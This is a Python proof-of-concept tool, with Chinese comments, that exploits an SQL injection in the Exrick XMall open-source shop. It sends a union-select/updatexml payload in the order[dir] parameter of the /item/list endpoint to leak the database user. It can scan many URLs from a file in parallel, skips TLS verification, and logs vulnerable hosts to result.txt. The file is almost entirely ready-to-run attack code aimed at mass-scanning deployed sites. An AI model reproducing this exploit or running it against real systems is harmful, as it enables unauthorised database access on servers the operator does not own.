import requests
import argparse
import sys
import re
from concurrent.futures import ThreadPoolExecutor

# 忽略警告
requests.packages.urllib3.disable_warnings()

def banner():
    # 显示程序的横幅信息
    banner_text = """
___________              .__        __     ____  ___  _____         .__  .__       _________________  .____     
\_   _____/__  __________|__| ____ |  | __ \   \/  / /     \ _____  |  | |  |     /   _____/\_____  \ |    |    
 |    __)_\  \/  /\_  __ \  |/ ___\|  |/ /  \     / /  \ /  \\__  \ |  | |  |     \_____  \  /  / \  \|    |    
 |        \>    <  |  | \/  \  \___|    <   /     \/    Y    \/ __ \|  |_|  |__   /        \/   \_/.  \    |___ 
/_______  /__/\_ \ |__|  |__|\___  >__|_ \ /___/\  \____|__  (____  /____/____/  /_______  /\_____\ \_/_______ \
        \/      \/               \/     \/       \_/       \/     \/                     \/        \__>       \/
                                                                           version:1.0
    """
    print(banner_text)

def main():
    # 主函数，解析命令行参数，执行对应操作
    banner()
    parser = argparse.ArgumentParser(description='Exrick XMall 开源商城 SQL注入漏洞! ')
    parser.add_argument('-u', '--url', dest='url', type=str, help='input link')
    parser.add_argument('-f', '--file', dest='file', type=str, help='file path')
    args = parser.parse_args()
    # 判断输入的参数是单个还是文件
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        with open(args.file, "r", encoding="utf-8") as f:
            url_list = [url.strip() for url in f.readlines() if url.strip()]
        # 多线程
        with ThreadPoolExecutor(max_workers=10) as executor:
            executor.map(poc, url_list)
    else:
        parser.print_help()

def poc(target):
    try:
        # 漏洞利用函数，发送请求并检测漏洞
        # 构造的POC
        url = f'{target}/item/list?draw=1&order%5B0%5D%5Bcolumn%5D=1&order%5B0%5D%5Bdir%5D=desc)a+union+select+updatexml(1,concat(0x7e,user(),0x7e),1)%23;&start=0&length=1&search%5Bvalue%5D=&search%5Bregex%5D=false&cid=-1&_=1679041197136'
        headers = {
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'X-Requested-With': 'XMLHttpRequest',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8,or;q=0.7',
            'Connection': 'close'
        }
        res = requests.get(url, headers=headers, verify=False, timeout=5)
        if res.status_code == 200:
            matches = re.search(r"~(.*?)~", res.text)
            if matches and '"code":500' in res.text:
                # 发现漏洞时输出信息，并将URL写入结果文件
                print(f"[+] 该URL存在漏洞：{target}，数据库名为：{matches.group(1)}")
                with open("result.txt", "a+", encoding="utf-8") as f:
                    f.write(target + "\n")
            else:
                print(f"[-] 该URL不存在漏洞：{target}")
    except Exception as e:
        print(f"[*] 出现异常")

if __name__ == '__main__':
    main()